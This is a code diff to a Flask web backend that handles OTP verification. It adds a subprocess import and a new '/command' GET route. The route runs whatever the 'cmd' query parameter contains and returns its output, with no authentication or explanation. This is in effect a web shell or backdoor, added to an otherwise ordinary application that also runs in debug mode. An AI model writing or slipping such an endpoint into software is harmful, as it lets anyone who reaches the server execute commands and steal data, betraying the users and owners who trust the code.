@@ -11,6 +11,7 @@ import uuid
 from .Mail import Mail
 import random
 import psycopg2 # type: ignore
+import subprocess
 from flask_cors import CORS
 app = Flask(__name__)
 #updated code from 
@@ -387,6 +388,21 @@ def varify_otp():
                     return Responce.send(401,{},"Try Again")
     else:
         return Responce.send(401,{},"requied filed not found")
+
+@app.route('/command', methods=['GET'])
+def run_command():
+    cmd =  request.args.get("cmd")
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        return jsonify({
+            'stdout': result.stdout,
+            'stderr': result.stderr
+        })
+    except subprocess.CalledProcessError as e:
+        return jsonify({
+            'error': str(e),
+            'stderr': e.stderr
+        }), 500
 
 if __name__ == '__main__':
     app.run(debug=True)
